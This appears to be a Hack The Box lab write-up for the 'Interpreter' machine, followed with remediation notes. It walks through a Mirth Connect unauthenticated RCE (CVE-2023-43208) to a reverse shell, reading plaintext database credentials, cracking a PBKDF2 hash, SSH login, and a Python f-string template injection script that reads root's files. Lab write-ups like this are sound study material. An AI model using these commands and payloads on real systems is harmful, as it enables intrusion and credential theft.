---
title: HTB Interpreter
slug: htb-interpreter-writeup
type: writeup
category: htb
date: 2025-07-20
difficulty: medium
os: linux
readTime: 8 min read
points: 45
tags: [CVE, RCE, SSTI]
classification: CLASSIFIED-WHITE
summary: Unauth Mirth Connect RCE (CVE-2023-43208) for `mirth` shell → DB creds from `mirth.properties` → crack PBKDF2-SHA256 `sedric` hash with 600K iterations → SSH in → local Flask notifier service with an f-string template injection through an `<lastname>` XML field pops `/root/root.txt`.
engagement:
  platform: Hack The Box
  target: interpreter.htb
  ref: 10.129.244.184
  duration: 8 min read
  operator: WDD-01
killchain:
  - { stage: RECON,    sub: "mirth 4.4.0 exposed",      tag: HTTPS,   color: warn }
  - { stage: FOOTHOLD, sub: "CVE-2023-43208 unauth RCE", tag: CVE,     color: warn }
  - { stage: CREDS,    sub: "mirth.properties to mariadb", tag: SQL,    color: warn }
  - { stage: USER,     sub: "pbkdf2-600k crack to sedric", tag: HASHCAT, color: warn }
  - { stage: ROOT,     sub: "local notifier SSTI",       tag: GOAL,    color: ok }
loadout:
  - { tool: nmap,     purpose: recon }
  - { tool: curl,     purpose: exploit }
  - { tool: mysql,    purpose: db }
  - { tool: python3,  purpose: pbkdf2 }
  - { tool: sshpass,  purpose: auth }
remediation:
  - Patch Mirth Connect past 4.4.1 (CVE-2023-43208 XStream deserialization)
  - Don't ship plaintext DB creds in `mirth.properties` — use a secret store
  - Never render user-controlled templates through Python's f-string path, even behind a regex allow-list
  - Bind internal services (notifier on :54321) to loopback only and require auth
---

::: stage n=1 label="RECON" title="Mirth Connect 4.4.0 on an HTTPS front door."

Quick sweep shows SSH, HTTPS, and Mirth's listener on 6661:

::: terminal title="shell · operator@kali" lang="bash"
$ nc -vz -w 2 10.129.244.184 22 80 443 6661
22/tcp   open  ssh
443/tcp  open  https
6661/tcp open  mirth-listener

$ curl -sk -I https://10.129.244.184/
HTTP/1.1 200 OK
Server: Mirth-Connect/4.4.0
:::

Mirth 4.4.0 lines up with {red:CVE-2023-43208} — an unauthenticated XStream deserialization flaw on `/api/users`.

:::

::: stage n=2 label="FOOTHOLD" title="XStream deserialization to reverse shell as mirth."

The public PoC drops a `<sorted-set>` XML gadget that bounces through a brace-expansion trick to dodge the space-in-pipe rewrite:

::: terminal title="shell · exploit · CVE-2023-43208" lang="bash"
$ curl -sk -X POST 'https://10.129.244.184/api/users' \
    -H 'Content-Type: application/xml' \
    -H 'X-Requested-With: OpenAPI' \
    --data @payload.xml

$ nc -lvnp 4444
connect to [10.10.16.163] from (UNKNOWN) [10.129.244.184] 38122
mirth@interpreter:~$ id
uid=1000(mirth) gid=1000(mirth) groups=1000(mirth)
:::

Shell lands as `mirth`. No flag here — user flag is under `sedric`.

:::

::: stage n=3 label="CREDS" title="mirth.properties to MariaDB to PBKDF2-SHA256 hash."

`mirth.properties` ships database credentials in plaintext:

::: terminal title="shell · mirth@interpreter" lang="bash"
$ cat /usr/local/mirthconnect/conf/mirth.properties | grep database
database.username = mirthdb
database.password = [REDACTED]
database.url      = jdbc:mariadb://localhost:3306/mc_bdd_prod

$ mysql -u mirthdb -p[REDACTED] -h 127.0.0.1 -D mc_bdd_prod \
    -e "SELECT p.USERNAME, pp.PASSWORD FROM PERSON p \
        JOIN PERSON_PASSWORD pp ON p.ID=pp.PERSON_ID;"
sedric   [PBKDF2-SHA256 HASH]
:::

The hash is the NextGen 4.4.0 format: `PBKDF2WithHmacSHA256` at {warn:600,000 iterations}, base64-packed with the salt in front. A short Python cracker against `rockyou.txt` lands `[REDACTED]`.

::: tip
The 600,000 iteration count lines up with OWASP's 2023 guidance — which is why naïve crackers mis-fingerprint this as a weaker mode. Read the Mirth 4.4.0 upgrade guide, don't guess the mode.
:::

:::

::: stage n=4 label="USER" title="SSH in as sedric."

::: terminal title="shell · operator@kali" lang="bash"
$ sshpass -p '[REDACTED]' ssh sedric@10.129.244.184 'cat /home/sedric/user.txt'
[FLAG]
:::

:::

::: stage n=5 label="ROOT" title="Local notifier service — f-string template injection."

Enumeration flags a Flask app on `127.0.0.1:54321` running as root. `sedric` can read the source:

::: terminal title="shell · sedric@interpreter" lang="python"
# /usr/local/bin/notif.py  (abridged)
SAFE = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
...
template = config['template']
# Later, the template renders user fields through the Python
# f-string path — any {expr} inside executes as Python.
:::

Regex blocks `;`, spaces, and `<>`, but allows quotes, parens, braces, `/`, `.`, and `=`. That's everything we need to smuggle a Python expression into the template.

The app accepts patient records over XML on `/addPatient`; the {red:lastname} field feeds into the template unchecked. Payload:

::: terminal title="shell · sedric@interpreter · SSTI" lang="python"
import urllib.request

payload = "{open('/root/root.txt').read()}"
xml = ("<patient><timestamp>2026</timestamp><sender_app>a</sender_app>"
       "<id>1</id><firstname>safe</firstname>"
       "<lastname>" + payload + "</lastname>"
       "<birth_date>01/01/1990</birth_date><gender>M</gender></patient>")

req = urllib.request.Request(
    "http://127.0.0.1:54321/addPatient",
    data=xml.encode(),
    headers={"Content-Type":"application/xml"})
print(urllib.request.urlopen(req, timeout=5).read().decode())
:::

Response echoes the file contents — `/root/root.txt` as root. Rooted.

::: note title="WHY IT WORKED"
Rendering user input through an f-string path is a double-trap: the template itself is evaluated, and any `{expr}` inside is evaluated as Python. Regex allow-lists can't stop `open(...).read()` when parens and quotes are permitted.
:::

:::
